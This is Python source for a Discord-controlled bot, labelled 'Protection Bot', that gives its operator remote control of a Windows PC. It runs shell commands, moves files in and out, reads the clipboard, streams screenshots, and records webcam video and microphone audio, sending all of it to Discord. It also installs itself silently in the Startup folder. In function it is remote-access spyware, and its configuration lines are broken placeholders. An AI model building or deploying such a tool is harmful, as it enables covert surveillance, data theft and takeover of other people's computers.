import os
import sys
import asyncio
import io
import wave
import tempfile
from datetime import datetime
from pathlib import Path

import discord
from discord.ext import commands
import pyautogui
import cv2
from PIL import Image, ImageGrab
import sounddevice as sd
import numpy as np
import pygame

# ==================== CONFIGURATION ====================
TOKEN = "your_token_here"              # Paste your bot token after reset
OWNER_ID = your_token_here                           # Your Discord user ID
CHANNEL_ID = your_token_here                         # Notification channel ID
UPLOAD_FOLDER = Path(r"C:\Desktop")
# =======================================================

UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
sslive_task = None
selected_monitor = 0
selected_mic = None

def get_startup_folder():
    return Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"

def get_script_path():
    if getattr(sys, "frozen", False):
        return Path(sys.executable)
    return Path(__file__).resolve()

def is_autostart_enabled():
    startup = get_startup_folder()
    return (startup / "OchronaBot.bat").exists() or (startup / "OchronaBot.lnk").exists()

def press_key(vk):
    import ctypes
    ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
    ctypes.windll.user32.keybd_event(vk, 0, 2, 0)

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        try:
            embed = discord.Embed(
                title="✅ Protection Bot started",
                description=f"**Computer:** `{os.environ.get('COMPUTERNAME', '?')}`\n**Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
                color=0x00ff88
            )
            await channel.send(embed=embed)
        except:
            pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ No permission.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ {type(error).__name__}: {error}")

async def send_long(ctx, text, filename="output.txt"):
    if len(text) < 1900:
        await ctx.send(f"```\n{text}\n```")
    else:
        await ctx.send(file=discord.File(io.BytesIO(text.encode("utf-8", errors="replace")), filename=filename))

@bot.command(name="help")
@is_owner()
async def help_cmd(ctx):
    embed = discord.Embed(
        title="🛡️ Protection Bot – Command list",
        description="All commands work **only for you**.",
        color=0x5865F2
    )
    embed.add_field(name="📌 Basic", value="`.help` `.status` `.switch` `.switch 0/1`", inline=False)
    embed.add_field(name="💻 System", value="`.cmd` `.ls` `.download` `.upload` `.procs` `.windows` `.kill` `.clipboard`", inline=False)
    embed.add_field(name="👁️ Monitoring", value="`.ss` `.sslive on/off` `.webcam` `.camrec` `.mic` `.choosemic`", inline=False)
    embed.add_field(name="🔊 Audio", value="`.soundplay` `.soundstop` `.volume` `.volup` `.voldown` `.mute`", inline=False)
    embed.add_field(name="⚡ Power", value="`.lock` `.shutdown` `.restart` `.battery`", inline=False)
    embed.add_field(name="🌐 Other", value="`.open` `.notify` `.join` `.leave` `.autoon` `.autooff` `.autostatus` `.destroy`", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="status")
@is_owner()
async def status(ctx):
    try:
        import psutil
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        embed = discord.Embed(title="📊 System status", color=0x00ff88)
        embed.add_field(name="Host", value=f"`{os.environ.get('COMPUTERNAME')}`", inline=True)
        embed.add_field(name="CPU", value=f"**{cpu}%**", inline=True)
        embed.add_field(name="RAM", value=f"**{mem.percent}%**", inline=True)
        embed.add_field(name="Disk", value=f"**{disk.percent}%**", inline=True)
        embed.add_field(name="Booted", value=f"`{boot}`", inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="switch")
@is_owner()
async def switch_monitors(ctx, monitor_id: int = None):
    global selected_monitor
    try:
        from screeninfo import get_monitors as get_mons
        mons = list(get_mons())
    except Exception:
        mons = []
    if monitor_id is None:
        if not mons:
            size = pyautogui.size()
            await ctx.send(f"`0` → **Primary** {size[0]}x{size[1]}")
            return
        lines = [f"`{i}` → {m.width}x{m.height}{' (primary)' if m.is_primary else ''}" for i, m in enumerate(mons)]
        await ctx.send(embed=discord.Embed(
            title="🖥️ Monitors",
            description="\n".join(lines) + f"\n\nSelected: **{selected_monitor}**",
            color=0x5865F2
        ))
        return
    if not mons:
        if monitor_id == 0:
            selected_monitor = 0
            await ctx.send("✅ Monitor **0**")
        else:
            await ctx.send("❌ Only monitor `0` available")
        return
    if monitor_id < 0 or monitor_id >= len(mons):
        await ctx.send(f"❌ Invalid number. Available: 0–{len(mons)-1}")
        return
    selected_monitor = monitor_id
    await ctx.send(f"✅ Monitor **{monitor_id}**")

@bot.command(name="cmd", aliases=["exec"])
@is_owner()
async def run_command(ctx, *, command: str):
    await ctx.send(f"⏳ `{command}`")
    try:
        proc = await asyncio.create_subprocess_shell(
            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        out = (stdout or b"").decode("utf-8", errors="replace")
        err = (stderr or b"").decode("utf-8", errors="replace")
        await send_long(ctx, f"Exit code: {proc.returncode}\n{out}\n{err}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="ls")
@is_owner()
async def list_dir(ctx, *, path: str = "."):
    try:
        path = path.strip().strip('"').strip("'").replace("/", "\\")
        p = Path(path)
        if not p.is_absolute():
            p = Path.cwd() / p
        p = p.resolve()
        if not p.exists():
            await ctx.send(f"❌ Does not exist:\n`{p}`")
            return
        if p.is_file():
            await ctx.send(f"📄 `{p.name}` ({p.stat().st_size/1024:.1f} KB)\n`{p}`")
            return
        entries = []
        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            if item.is_dir():
                entries.append(f"📁 `{item.name}`")
            else:
                entries.append(f"📄 `{item.name}` ({item.stat().st_size/1024:.1f} KB)")
        text = f"**{p}**\n" + "\n".join(entries[:60])
        await send_long(ctx, text, "listing.txt")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="download", aliases=["dl"])
@is_owner()
async def download_file(ctx, *, path: str):
    try:
        path = path.strip().strip('"').strip("'").replace("/", "\\")
        p = Path(path)
        if not p.is_absolute():
            p = Path.cwd() / p
        if not p.exists():
            await ctx.send(f"❌ Not found:\n`{p}`\nUse `.ls` to check the path.")
            return
        p = p.resolve()
        if not p.is_file():
            await ctx.send(f"❌ This is a folder, not a file:\n`{p}`")
            return
        size = p.stat().st_size
        if size > 24 * 1024 * 1024:
            await ctx.send(f"❌ Too large: **{size/1024/1024:.1f} MB** (limit ~24 MB)")
            return
        await ctx.send(f"⬇️ `{p.name}` ({size/1024:.1f} KB)…")
        await ctx.send(file=discord.File(str(p), filename=p.name))
    except PermissionError:
        await ctx.send("❌ Permission denied.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="upload")
@is_owner()
async def upload_file(ctx):
    if not ctx.message.attachments:
        await ctx.send("Attach a file.")
        return
    for att in ctx.message.attachments:
        dest = UPLOAD_FOLDER / att.filename
        await att.save(dest)
        await ctx.send(f"✅ `{dest}`")

@bot.command(name="procs")
@is_owner()
async def processes(ctx):
    try:
        import psutil
        procs = sorted(
            [(p.info["memory_info"].rss // 1024**2, p.info["pid"], p.info["name"])
             for p in psutil.process_iter(["pid", "name", "memory_info"]) if p.info.get("memory_info")],
            reverse=True
        )[:12]
        lines = [f"`{pid}` **{name}** — {mem} MB" for mem, pid, name in procs]
        await ctx.send(embed=discord.Embed(title="📋 Processes", description="\n".join(lines), color=0xffaa00))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="windows")
@is_owner()
async def open_windows(ctx):
    try:
        import pygetwindow as gw
        wins = [w for w in gw.getAllTitles() if w.strip()][:20]
        await ctx.send(embed=discord.Embed(
            title="🪟 Windows",
            description="\n".join(f"• `{w[:45]}`" for w in wins) or "None",
            color=0x5865F2
        ))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="kill")
@is_owner()
async def kill_process(ctx, *, name: str):
    try:
        import psutil
        killed = 0
        for p in psutil.process_iter(["name"]):
            if name.lower() in (p.info["name"] or "").lower():
                p.kill()
                killed += 1
        await ctx.send(f"☠️ Killed **{killed}** × `{name}`" if killed else f"Not found: `{name}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="clipboard")
@is_owner()
async def clipboard(ctx):
    try:
        import pyperclip
        text = pyperclip.paste()
        await ctx.send(f"📋 ```\n{(text or 'empty')[:1400]}\n```")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="screenshot", aliases=["ss"])
@is_owner()
async def screenshot(ctx):
    await ctx.send("📸 …")
    try:
        try:
            from screeninfo import get_monitors as get_mons
            mons = list(get_mons())
        except Exception:
            mons = []
        if mons and 0 <= selected_monitor < len(mons):
            m = mons[selected_monitor]
            img = ImageGrab.grab(bbox=(m.x, m.y, m.x + m.width, m.y + m.height))
        else:
            img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(file=discord.File(buf, filename=f"ss_{selected_monitor}.png"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="sslive")
@is_owner()
async def sslive(ctx, mode: str = "status"):
    global sslive_task
    mode = mode.lower()
    if mode == "on":
        if sslive_task and not sslive_task.done():
            await ctx.send("Already running")
            return
        await ctx.send("✅ Live screenshots enabled")
        async def loop():
            while True:
                try:
                    try:
                        from screeninfo import get_monitors as get_mons
                        mons = list(get_mons())
                    except Exception:
                        mons = []
                    if mons and 0 <= selected_monitor < len(mons):
                        m = mons[selected_monitor]
                        img = ImageGrab.grab(bbox=(m.x, m.y, m.x + m.width, m.y + m.height))
                    else:
                        img = pyautogui.screenshot()
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=60)
                    buf.seek(0)
                    await ctx.send(file=discord.File(buf, "live.jpg"))
                except Exception as e:
                    print(e)
                await asyncio.sleep(3)
        sslive_task = bot.loop.create_task(loop())
    elif mode == "off":
        if sslive_task and not sslive_task.done():
            sslive_task.cancel()
            sslive_task = None
            await ctx.send("⏹️ Stopped")
        else:
            await ctx.send("Was not running")
    else:
        st = "🟢 ON" if (sslive_task and not sslive_task.done()) else "🔴 OFF"
        await ctx.send(f"Status: {st}")

@bot.command(name="webcam", aliases=["cam"])
@is_owner()
async def webcam(ctx):
    await ctx.send("📷 …")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send("❌ No image")
            return
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=85)
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "cam.jpg"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="choosemic")
@is_owner()
async def choose_mic(ctx, device_id: int = None):
    global selected_mic
    try:
        devices = sd.query_devices()
        input_devices = [(i, d["name"]) for i, d in enumerate(devices) if d["max_input_channels"] > 0]
        if not input_devices:
            await ctx.send("❌ No microphones found")
            return
        if device_id is None:
            lines = [f"`{i}` → **{name}**" for i, name in input_devices]
            current = f"\n\nSelected: **{selected_mic}**" if selected_mic is not None else "\n\nSelected: default"
            await ctx.send(embed=discord.Embed(
                title="🎙️ Microphones",
                description="\n".join(lines) + current + "\n\n`.choosemic number`",
                color=0x5865F2
            ))
            return
        valid = [i for i, _ in input_devices]
        if device_id not in valid:
            await ctx.send(f"❌ Invalid number: {valid}")
            return
        selected_mic = device_id
        name = next(n for i, n in input_devices if i == device_id)
        await ctx.send(f"✅ Microphone **{device_id}**: `{name}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="camrec")
@is_owner()
async def camera_record(ctx, seconds: float = 5.0):
    seconds = max(2.0, min(seconds, 12.0))
    await ctx.send(f"🎥 {seconds}s…")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            await ctx.send("❌ Camera not available")
            return
        w, h = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = 15
        temp_path = Path(tempfile.gettempdir()) / f"camrec_{ctx.message.id}.avi"
        out = cv2.VideoWriter(str(temp_path), cv2.VideoWriter_fourcc(*"XVID"), fps, (w, h))
        for _ in range(int(seconds * fps)):
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            await asyncio.sleep(1 / fps)
        cap.release()
        out.release()
        if temp_path.stat().st_size > 24 * 1024 * 1024:
            await ctx.send("❌ File too large")
            temp_path.unlink(missing_ok=True)
            return
        await ctx.send(file=discord.File(str(temp_path), filename="camrec.avi"))
        temp_path.unlink(missing_ok=True)
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="mic")
@is_owner()
async def mic_record(ctx, seconds: float = 5.0):
    seconds = max(1.0, min(seconds, 15.0))
    await ctx.send(f"🎙️ {seconds}s…")
    try:
        kwargs = {"frames": int(seconds * 44100), "samplerate": 44100, "channels": 1, "dtype": "float32"}
        if selected_mic is not None:
            kwargs["device"] = selected_mic
        rec = sd.rec(**kwargs)
        sd.wait()
        audio = (rec * 32767).astype(np.int16)
        buf = io.BytesIO()
        with wave.open(buf, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(44100)
            wf.writeframes(audio.tobytes())
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "mic.wav"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="soundplay")
@is_owner()
async def soundplay(ctx, volume: float = 0.7):
    if not ctx.message.attachments:
        await ctx.send("❌ Attach an MP3/WAV file")
        return
    att = ctx.message.attachments[0]
    if not att.filename.lower().endswith((".mp3", ".wav", ".ogg")):
        await ctx.send("❌ Only mp3/wav/ogg")
        return
    volume = max(0.0, min(1.0, volume))
    try:
        temp = Path(tempfile.gettempdir()) / f"snd_{att.id}_{att.filename}"
        await att.save(str(temp))
        try:
            pygame.mixer.music.stop()
            pygame.mixer.music.unload()
        except:
            pass
        pygame.mixer.music.load(str(temp))
        pygame.mixer.music.set_volume(volume)
        pygame.mixer.music.play()
        await ctx.send(f"🔊 `{att.filename}` ({int(volume*100)}%)")
    except Exception as e:
        if "corrupt" in str(e).lower() or "bad stream" in str(e).lower():
            await ctx.send("❌ Bad MP3 – try WAV")
        else:
            await ctx.send(f"❌ {e}")

@bot.command(name="soundstop")
@is_owner()
async def soundstop(ctx):
    try:
        pygame.mixer.music.stop()
        await ctx.send("⏹️ Stopped")
    except:
        await ctx.send("Nothing is playing")

@bot.command(name="mute")
@is_owner()
async def mute(ctx):
    try:
        press_key(0xAD)  # VK_VOLUME_MUTE
        await ctx.send("🔇 Mute toggled")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="unmute")
@is_owner()
async def unmute(ctx):
    try:
        press_key(0xAD)
        await ctx.send("🔊 Mute toggled")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="volume")
@is_owner()
async def set_volume(ctx, level: int = None):
    try:
        if level is None:
            await ctx.send("`.volume 0-100`  |  `.volup`  |  `.voldown`  |  `.mute`")
            return
        level = max(0, min(100, level))
        for _ in range(50):
            press_key(0xAE)  # volume down
        for _ in range(int(level / 2)):
            press_key(0xAF)  # volume up
        await ctx.send(f"🔊 approx. **{level}%**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="volup")
@is_owner()
async def vol_up(ctx, times: int = 5):
    times = max(1, min(times, 20))
    for _ in range(times):
        press_key(0xAF)
    await ctx.send(f"🔊 +{times}")

@bot.command(name="voldown")
@is_owner()
async def vol_down(ctx, times: int = 5):
    times = max(1, min(times, 20))
    for _ in range(times):
        press_key(0xAE)
    await ctx.send(f"🔉 -{times}")

@bot.command(name="lock")
@is_owner()
async def lock_pc(ctx):
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("🔒 Locked")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="shutdown")
@is_owner()
async def shutdown_pc(ctx):
    await ctx.send("⚠️ Shutting down in 10s")
    os.system("shutdown /s /t 10")

@bot.command(name="restart")
@is_owner()
async def restart_pc(ctx):
    await ctx.send("⚠️ Restarting in 10s")
    os.system("shutdown /r /t 10")

@bot.command(name="battery")
@is_owner()
async def battery(ctx):
    try:
        import psutil
        bat = psutil.sensors_battery()
        if not bat:
            await ctx.send("No battery")
            return
        st = "🔌" if bat.power_plugged else "🔋"
        await ctx.send(f"{st} **{bat.percent}%**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="open")
@is_owner()
async def open_url(ctx, url: str):
    try:
        import webbrowser
        if not url.startswith("http"):
            url = "https://" + url
        webbrowser.open(url)
        await ctx.send(f"🌐 `{url}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="notify")
@is_owner()
async def notify(ctx, *, text: str):
    try:
        from win10toast import ToastNotifier
        ToastNotifier().show_toast("Protection Bot", text, duration=5, threaded=True)
        await ctx.send(f"🔔 `{text}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="join")
@is_owner()
async def join_voice(ctx, *, channel_name: str = None):
    channels = ctx.guild.voice_channels
    if not channels:
        await ctx.send("No voice channels")
        return
    if channel_name is None:
        lista = "\n".join(f"`{i+1}.` **{c.name}**" for i, c in enumerate(channels))
        await ctx.send(f"**Channels:**\n{lista}")
        return
    ch = discord.utils.find(lambda c: c.name.lower() == channel_name.lower(), channels)
    if not ch:
        await ctx.send("❌ Not found")
        return
    try:
        if ctx.voice_client:
            await ctx.voice_client.move_to(ch)
        else:
            await ch.connect()
        await ctx.send(f"✅ **{ch.name}**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="leave")
@is_owner()
async def leave_voice(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("👋 Left")
    else:
        await ctx.send("Not in a voice channel")

@bot.command(name="micon")
@is_owner()
async def micon(ctx):
    await ctx.send("Use `.mic 5`")

@bot.command(name="micoff")
@is_owner()
async def micoff(ctx):
    await ctx.send("OK")

@bot.command(name="autoon")
@is_owner()
async def auto_on(ctx):
    try:
        startup = get_startup_folder()
        script = get_script_path()
        bat_path = startup / "OchronaBot.bat"
        if script.suffix.lower() == ".exe":
            content = f'@echo off\nstart "" "{script}"\n'
        else:
            pythonw = Path(sys.executable).with_name("pythonw.exe")
            if not pythonw.exists():
                pythonw = Path(sys.executable)
            content = f'@echo off\nstart "" "{pythonw}" "{script}"\n'
        bat_path.write_text(content, encoding="utf-8")
        await ctx.send(f"✅ Autostart **enabled**\n`{bat_path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="autooff")
@is_owner()
async def auto_off(ctx):
    try:
        startup = get_startup_folder()
        removed = False
        for name in ["OchronaBot.bat", "OchronaBot.lnk"]:
            p = startup / name
            if p.exists():
                p.unlink()
                removed = True
        await ctx.send("✅ Autostart **disabled**" if removed else "Was not enabled.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="autostatus")
@is_owner()
async def auto_status(ctx):
    await ctx.send("🟢 **ENABLED**" if is_autostart_enabled() else "🔴 **DISABLED**")

@bot.command(name="destroy")
@is_owner()
async def destroy(ctx):
    await ctx.send("💥 Shutting down…")
    await bot.close()
    os._exit(0)

if __name__ == "__main__":
    if not TOKEN or TOKEN == "your_token_here" or OWNER_ID == 0:
        print("Fill in TOKEN and OWNER_ID!")
        sys.exit(1)
    print("[*] Starting...")
    bot.run(TOKEN)
